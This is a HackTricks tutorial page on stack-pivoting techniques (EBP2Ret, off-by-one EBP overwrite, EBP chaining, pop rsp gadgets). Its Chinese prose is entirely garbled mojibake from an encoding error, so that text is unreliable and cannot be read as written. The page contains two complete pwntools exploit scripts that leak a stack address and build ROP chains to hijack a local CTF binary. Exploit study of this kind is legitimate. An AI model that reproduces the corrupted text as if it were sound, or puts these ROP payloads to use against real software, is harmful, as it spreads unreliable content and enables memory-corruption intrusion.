# æ ˆè½¬ç§» - EBP2Ret - EBPé“¾æ¥

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## åŸºæœ¬ä¿¡æ¯

è¿™ç§æŠ€æœ¯åˆ©ç”¨äº†æ“çºµ**åŸºæŒ‡é’ˆï¼ˆEBPï¼‰**çš„èƒ½åŠ›ï¼Œé€šè¿‡ç²¾å¿ƒä½¿ç”¨EBPå¯„å­˜å™¨å’Œ`leave; ret`æŒ‡ä»¤åºåˆ—æ¥é“¾æ¥æ‰§è¡Œå¤šä¸ªå‡½æ•°ã€‚

ä½œä¸ºæé†’ï¼Œ**`leave`**åŸºæœ¬ä¸Šæ„å‘³ç€ï¼š
```
movl               %ebp, %esp
popl               %ebp
ret
```
ç”±äº**EBPåœ¨EIPä¹‹å‰ä½äºå †æ ˆä¸­**ï¼Œå› æ­¤å¯ä»¥é€šè¿‡æ§åˆ¶å †æ ˆæ¥æ§åˆ¶å®ƒã€‚

### EBP2Ret

å½“æ‚¨å¯ä»¥**æ›´æ”¹EBPå¯„å­˜å™¨ä½†æ— æ³•ç›´æ¥æ›´æ”¹EIPå¯„å­˜å™¨**æ—¶ï¼Œæ­¤æŠ€æœ¯ç‰¹åˆ«æœ‰ç”¨ã€‚å®ƒåˆ©ç”¨å‡½æ•°æ‰§è¡Œå®Œæ¯•æ—¶çš„è¡Œä¸ºã€‚

å¦‚æœåœ¨`fvuln`æ‰§è¡ŒæœŸé—´ï¼Œæ‚¨æˆåŠŸåœ¨å †æ ˆä¸­æ³¨å…¥ä¸€ä¸ªæŒ‡å‘å†…å­˜ä¸­åŒ…å«æ‚¨çš„shellcodeåœ°å€çš„åŒºåŸŸçš„**ä¼ªé€ EBP**ï¼ˆå†åŠ ä¸Š4ä¸ªå­—èŠ‚ä»¥è€ƒè™‘`pop`æ“ä½œï¼‰ï¼Œåˆ™å¯ä»¥é—´æ¥æ§åˆ¶EIPã€‚å½“`fvuln`è¿”å›æ—¶ï¼ŒESPè®¾ç½®ä¸ºæ­¤ç²¾å¿ƒæ„é€ çš„ä½ç½®ï¼Œå¹¶ä¸”éšåçš„`pop`æ“ä½œå°†ESPå‡å°‘4ï¼Œæœ‰æ•ˆåœ°ä½¿å…¶æŒ‡å‘æ‚¨çš„shellcodeã€‚å½“æ‰§è¡Œ`ret`æŒ‡ä»¤æ—¶ï¼Œæ§åˆ¶å°†è½¬ç§»åˆ°æ‚¨çš„shellcodeã€‚

#### æ”»å‡»æ„é€ 

é¦–å…ˆï¼Œæ‚¨éœ€è¦**åœ¨å¯æ‰§è¡Œå†…å­˜ä¸­çš„æŸå¤„æ³¨å…¥æ‚¨çš„shellcode**å¹¶**è·å–åœ°å€**ï¼Œæˆ–è·å–åˆ°æœ‰æ•ˆçš„[**ONE\_GADGET**](https://github.com/david942j/one\_gadget)çš„åœ°å€ï¼Œæˆ–ä½¿ESPæŒ‡å‘ä¸€ä¸ªåŒ…å«`system()`åœ°å€åè·Ÿ**4ä¸ªåƒåœ¾å­—èŠ‚**å’Œ`"/bin/sh"`åœ°å€çš„ä½ç½®ã€‚

ç„¶åï¼Œåˆ›å»ºå¡«å……å¹¶ä½¿ç”¨`shellcode/one_gadgetåœ°å€ - 4`æ¥**ç ´åEBP**ã€‚å¿…é¡»æ˜¯`-4`ï¼Œå› ä¸ºæœ‰`pop`æ“ä½œã€‚ç„¶åï¼ŒESPå°†æŒ‡å‘æˆ‘ä»¬æœŸæœ›çš„åœ°å€ï¼Œ`ret`å°†è¢«æ‰§è¡Œã€‚

#### Off-By-One Exploit

è¿™ç§æŠ€æœ¯çš„ä¸€ä¸ªç‰¹å®šå˜ä½“ç§°ä¸ºâ€œOff-By-One Exploitâ€ã€‚å½“æ‚¨**åªèƒ½ä¿®æ”¹EBPçš„æœ€ä½æœ‰æ•ˆå­—èŠ‚**æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å®ƒã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå­˜å‚¨shellcodeåœ°å€çš„å†…å­˜ä½ç½®å¿…é¡»ä¸EBPçš„å‰ä¸‰ä¸ªå­—èŠ‚å…±äº«ï¼Œä»è€Œå…è®¸åœ¨æ›´å—é™åˆ¶çš„æ¡ä»¶ä¸‹è¿›è¡Œç±»ä¼¼çš„æ“ä½œã€‚

### **EBP Chaining**

å› æ­¤ï¼Œåœ¨å †æ ˆçš„`EBP`æ¡ç›®ä¸­æ”¾ç½®ä¸€ä¸ªå—æ§åœ°å€ï¼Œå¹¶åœ¨`EIP`ä¸­æ”¾ç½®ä¸€ä¸ª`leave; ret`çš„åœ°å€ï¼Œå°±å¯ä»¥**å°†`ESP`ç§»åŠ¨åˆ°å †æ ˆä¸­å—æ§çš„`EBP`åœ°å€**ã€‚

ç°åœ¨ï¼Œ**`ESP`**å—æ§åœ°æŒ‡å‘ä¸€ä¸ªæœŸæœ›çš„åœ°å€ï¼Œä¸‹ä¸€ä¸ªè¦æ‰§è¡Œçš„æŒ‡ä»¤æ˜¯`RET`ã€‚ä¸ºäº†æ»¥ç”¨è¿™ä¸€ç‚¹ï¼Œå¯ä»¥åœ¨å—æ§ESPä½ç½®æ”¾ç½®ä»¥ä¸‹å†…å®¹ï¼š

* **`&(ä¸‹ä¸€ä¸ªä¼ªé€ EBP)`** -> åŠ è½½æ–°çš„EBPï¼Œå› ä¸º`leave`æŒ‡ä»¤ä¸­æœ‰`pop ebp`
* **`system()`** -> è¢«`ret`è°ƒç”¨
* **`&(leave;ret)`** -> åœ¨systemç»“æŸåè°ƒç”¨ï¼Œå®ƒå°†å°†ESPç§»åŠ¨åˆ°ä¼ªé€ çš„EBPå¹¶é‡æ–°å¼€å§‹
* **`&("/bin/sh")`**-> ç”¨äº`system`çš„å‚æ•°

åŸºæœ¬ä¸Šï¼Œé€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¯ä»¥é“¾æ¥å¤šä¸ªä¼ªé€ çš„EBPä»¥æ§åˆ¶ç¨‹åºçš„æµç¨‹ã€‚

è€å®è¯´ï¼Œè¿™æœ‰ç‚¹åƒ[ret2lib](ret2lib/)ï¼Œä½†æ›´å¤æ‚ï¼Œæ²¡æœ‰æ˜æ˜¾çš„å¥½å¤„ï¼Œä½†åœ¨æŸäº›è¾¹ç¼˜æƒ…å†µä¸‹å¯èƒ½ä¼šå¾ˆæœ‰è¶£ã€‚

æ­¤å¤–ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªä½¿ç”¨æ­¤æŠ€æœ¯çš„**å †æ ˆæ³„æ¼**è°ƒç”¨è·èƒœå‡½æ•°çš„[**æŒ‘æˆ˜ç¤ºä¾‹**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave)ã€‚è¿™æ˜¯é¡µé¢ä¸Šçš„æœ€ç»ˆæœ‰æ•ˆè½½è·ï¼š
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## æ§åˆ¶ RSP çš„å…¶ä»–æ–¹æ³•

### **`pop rsp`** æœºå…³

[**åœ¨è¿™ä¸ªé¡µé¢**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp)ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä½¿ç”¨è¿™ç§æŠ€æœ¯çš„ç¤ºä¾‹ã€‚å¯¹äºè¿™ä¸ªæŒ‘æˆ˜ï¼Œéœ€è¦è°ƒç”¨ä¸€ä¸ªå¸¦æœ‰ä¸¤ä¸ªç‰¹å®šå‚æ•°çš„å‡½æ•°ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ª**`pop rsp` æœºå…³**ä»¥åŠ**æ¥è‡ªå †æ ˆçš„æ³„æ¼**ï¼š
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<rag>, rsp æœºå…³
```
pop <reg>                <=== return pointer
<reg value>
xchg <rag>, rsp
```
## å‚è€ƒèµ„æ–™

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
